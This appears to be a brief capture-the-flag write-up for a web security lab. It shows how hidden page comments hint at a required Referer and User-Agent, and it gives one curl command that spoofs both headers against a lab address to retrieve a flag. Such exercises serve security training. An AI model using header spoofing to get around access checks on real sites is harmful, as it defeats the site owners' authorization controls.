# Spoof Curl
In the file there are a lot of comments, but there are these two specific ones, which are clues to getting this flag

## Manipulation
they tell us that we must be comming from the [https://www.nsa.gov](https://www.nsa.gov "nsa.gov"), and so we will change the referer and the also say we must use ft_bornToSec so we change the user-agent

```bash
curl http://10.203.72.119/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c -H 'Referer:https://www.nsa.gov/' -H 'User-agent:ft_bornToSec' | grep "flag"
```
this will then get us the flag



































